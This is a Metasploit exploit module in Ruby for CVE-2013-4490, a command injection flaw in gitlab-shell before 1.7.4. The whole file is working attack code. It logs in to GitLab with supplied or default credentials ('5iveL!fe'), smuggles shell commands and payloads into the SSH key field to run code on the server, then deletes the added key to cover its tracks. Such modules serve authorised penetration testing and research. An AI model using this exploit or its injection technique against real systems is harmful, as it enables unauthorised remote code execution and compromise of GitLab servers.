# This module requires Metasploit: http//metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

require &#039;msf/core&#039;
require &#039;net/ssh&#039;

class Metasploit3 < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient
  include Msf::Exploit::CmdStager

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039;           => &#039;Gitlab-shell Code Execution&#039;,
      &#039;Description&#039;    => %q(
        This module takes advantage of the addition of authorized
        ssh keys in the gitlab-shell functionality of Gitlab. Versions
        of gitlab-shell prior to 1.7.4 used the ssh key provided directly
        in a system call resulting in a command injection vulnerability. As
        this relies on adding an ssh key to an account valid credentials
        are required to exploit this vulnerability.
      ),
      &#039;Author&#039;  =>
        [
          &#039;Brandon Knight&#039;
        ],
      &#039;License&#039;        => MSF_LICENSE,
      &#039;References&#039;     =>
        [
          [&#039;URL&#039;, &#039;https://about.gitlab.com/2013/11/04/gitlab-ce-6-2-and-5-4-security-release/&#039;],
          [&#039;CVE&#039;, &#039;2013-4490&#039;]
        ],
      &#039;Platform&#039;  => &#039;linux&#039;,
      &#039;Targets&#039;        =>
        [
          [ &#039;Linux&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039; => ARCH_X86
            }
          ],
          [ &#039;Linux (x64)&#039;,
            {
              &#039;Platform&#039; => &#039;linux&#039;,
              &#039;Arch&#039; => ARCH_X86_64
            }
          ],
          [ &#039;Unix (CMD)&#039;,
            {
              &#039;Platform&#039; => &#039;unix&#039;,
              &#039;Arch&#039; => ARCH_CMD,
              &#039;Payload&#039; =>
                {
                  &#039;Compat&#039;      =>
                    {
                      &#039;RequiredCmd&#039; => &#039;openssl perl python&#039;
                    },
                  &#039;BadChars&#039; => "\x22"
                }
            }
          ],
          [ &#039;Python&#039;,
            {
              &#039;Platform&#039; => &#039;python&#039;,
              &#039;Arch&#039; => ARCH_PYTHON,
              &#039;Payload&#039; =>
                {
                  &#039;BadChars&#039; => "\x22"
                }
            }
          ]
        ],
      &#039;CmdStagerFlavor&#039; => %w( bourne printf ),
      &#039;DisclosureDate&#039; => &#039;Nov 4 2013&#039;,
      &#039;DefaultTarget&#039;  => 0))

    register_options(
      [
        OptString.new(&#039;USERNAME&#039;,  [true, &#039;The username to authenticate as&#039;, &#039;root&#039;]),
        OptString.new(&#039;PASSWORD&#039;,  [true, &#039;The password for the specified username&#039;, &#039;5iveL!fe&#039;]),
        OptString.new(&#039;TARGETURI&#039;, [true,  &#039;The path to Gitlab&#039;, &#039;/&#039;])
      ], self.class)
  end

  def exploit
    login
    case target[&#039;Platform&#039;]
    when &#039;unix&#039;
      execute_command(payload.encoded)
    when &#039;python&#039;
      execute_command("python -c \\\"#{payload.encoded}\\\"")
    when &#039;linux&#039;
      execute_cmdstager(temp: &#039;./&#039;, linemax: 2800)
    end
  end

  def execute_command(cmd, _opts = {})
    key_id = add_key(cmd)
    delete_key(key_id)
  end

  def check
    res = send_request_cgi(&#039;uri&#039; => normalize_uri(target_uri.path.to_s, &#039;users&#039;, &#039;sign_in&#039;))
    if res && res.body && res.body.include?(&#039;GitLab&#039;)
      return Exploit::CheckCode::Detected
    else
      return Exploit::CheckCode::Unknown
    end
  end

  def login
    username = datastore[&#039;USERNAME&#039;]
    password = datastore[&#039;PASSWORD&#039;]
    signin_page = normalize_uri(target_uri.path.to_s, &#039;users&#039;, &#039;sign_in&#039;)

    # Get a valid session cookie and authenticity_token for the next step
    res = send_request_cgi(
                            &#039;method&#039; => &#039;GET&#039;,
                            &#039;cookie&#039; => &#039;request_method=GET&#039;,
                            &#039;uri&#039;    => signin_page
    )

    fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out during login") unless res

    local_session_cookie = res.get_cookies.scan(/(_gitlab_session=[A-Za-z0-9%-]+)/).flatten[0]
    auth_token = res.body.scan(/<input name="authenticity_token" type="hidden" value="(.*?)"/).flatten[0]

    if res.body.include? &#039;user[email]&#039;
      @gitlab_version = 5
      user_field = &#039;user[email]&#039;
    else
      @gitlab_version = 7
      user_field = &#039;user[login]&#039;
    end

    # Perform the actual login and get the newly assigned session cookie
    res = send_request_cgi(
                            &#039;method&#039; => &#039;POST&#039;,
                            &#039;cookie&#039; => local_session_cookie,
                            &#039;uri&#039;    => signin_page,
                            &#039;vars_post&#039; =>
                              {
                                &#039;utf8&#039; => "\xE2\x9C\x93",
                                &#039;authenticity_token&#039; => auth_token,
                                "#{user_field}" => username,
                                &#039;user[password]&#039; => password,
                                &#039;user[remember_me]&#039; => 0
                              }
                          )

    fail_with(Failure::NoAccess, "#{peer} - Login failed") unless res && res.code == 302

    @session_cookie = res.get_cookies.scan(/(_gitlab_session=[A-Za-z0-9%-]+)/).flatten[0]

    fail_with(Failure::NoAccess, "#{peer} - Unable to get session cookie") if @session_cookie.nil?
  end

  def add_key(cmd)
    if @gitlab_version == 5
      @key_base = normalize_uri(target_uri.path.to_s, &#039;keys&#039;)
    else
      @key_base = normalize_uri(target_uri.path.to_s, &#039;profile&#039;, &#039;keys&#039;)
    end

    # Perform an initial request to get an authenticity_token so the actual
    # key addition can be done successfully.
    res = send_request_cgi(
                            &#039;method&#039; => &#039;GET&#039;,
                            &#039;cookie&#039; => "request_method=GET; #{@session_cookie}",
                            &#039;uri&#039;    => normalize_uri(@key_base, &#039;new&#039;)
    )

    fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out during request") unless res

    auth_token = res.body.scan(/<input name="authenticity_token" type="hidden" value="(.*?)"/).flatten[0]
    title = rand_text_alphanumeric(16)
    key_info = rand_text_alphanumeric(6)

    # Generate a random ssh key
    key = OpenSSL::PKey::RSA.new 2048
    type = key.ssh_type
    data = [key.to_blob].pack(&#039;m0&#039;)

    openssh_format = "#{type} #{data}"

    # Place the payload in to the key information to perform the command injection
    key = "#{openssh_format} #{key_info}&#039;;#{cmd}; echo &#039;"

    res = send_request_cgi(
                            &#039;method&#039; => &#039;POST&#039;,
                            &#039;cookie&#039; => "request_method=GET; #{@session_cookie}",
                            &#039;uri&#039;    => @key_base,
                            &#039;vars_post&#039; =>
                              {
                                &#039;utf8&#039; => "\xE2\x9C\x93",
                                &#039;authenticity_token&#039; => auth_token,
                                &#039;key[title]&#039; => title,
                                &#039;key[key]&#039; => key
                              }
                          )

    fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out during request") unless res

    # Get the newly added key id so it can be used for cleanup
    key_id = res.headers[&#039;Location&#039;].split(&#039;/&#039;)[-1]

    key_id
  end

  def delete_key(key_id)
    res = send_request_cgi(
                             &#039;method&#039; => &#039;GET&#039;,
                             &#039;cookie&#039; => "request_method=GET; #{@session_cookie}",
                             &#039;uri&#039;    => @key_base
                           )

    fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out during request") unless res

    auth_token = res.body.scan(/<meta content="(.*?)" name="csrf-token"/).flatten[0]

    # Remove the key which was added to clean up after ourselves
    res = send_request_cgi(
                             &#039;method&#039; => &#039;POST&#039;,
                             &#039;cookie&#039; => "#{@session_cookie}",
                             &#039;uri&#039;    => normalize_uri("#{@key_base}", "#{key_id}"),
                             &#039;vars_post&#039; =>
                             {
                               &#039;_method&#039; => &#039;delete&#039;,
                               &#039;authenticity_token&#039; => auth_token
                             }
                           )

    fail_with(Failure::TimeoutExpired, "#{peer} - Connection timed out during request") unless res
  end
end

